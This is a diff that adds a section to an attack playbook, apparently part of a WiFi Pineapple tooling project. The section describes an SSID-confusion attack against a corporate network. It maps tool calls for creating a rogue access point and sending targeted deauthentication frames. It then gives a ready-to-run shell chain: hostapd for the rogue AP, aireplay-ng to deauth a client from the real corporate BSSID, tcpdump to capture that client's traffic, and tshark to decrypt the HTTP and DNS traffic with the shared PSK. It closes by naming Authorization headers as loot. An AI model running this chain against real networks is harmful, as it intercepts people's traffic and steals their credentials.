@@ -52,6 +52,35 @@ run_sequence([
 ])
 ```
 
+## MCP mapping / fallback
+
+- `hostapd_up` → `server.do_create_rogue_ap(ssid, channel, security='wpa2',
+  psk=<shared>)` (uses hostapd under the hood on the Pineapple).
+- `deauth_targeted` → `server.do_deauth(bssid=..., client_mac=..., count=...)`.
+- `capture_start` / `capture_stop`, `wireshark_decrypt` — **not in `src/`**;
+  drive `tcpdump` on the Pineapple and `tshark` on the analyst host.
+
+**Fallback shell chain:**
+
+```bash
+# 1. rogue AP on the guest SSID with the shared PSK (see hostapd conf
+#    fragment in wpa3-transition-downgrade.md).
+sudo hostapd /etc/hostapd/rogue-guestnet.conf &
+
+# 2. targeted deauth (PMF-off only)
+sudo aireplay-ng -0 3 -a <real-corp-BSSID> -c 11:22:33:44:55:66 wlan1mon
+
+# 3. capture on the rogue's channel
+sudo tcpdump -i wlan1mon -c 5000 -w /tmp/ssidconf.pcapng \
+    "wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66"
+
+# 4. offline decrypt with the shared PSK
+tshark -r /tmp/ssidconf.pcapng \
+    -o "wlan.enable_decryption:TRUE" \
+    -o 'uat:80211_keys:"wpa-pwd","<shared PSK>:GuestNet"' \
+    -Y "http.request or http.response or dns" -V
+```
+
 ## The flag surface
 
 - **Authorization header** the client sends assuming it's on Corp.
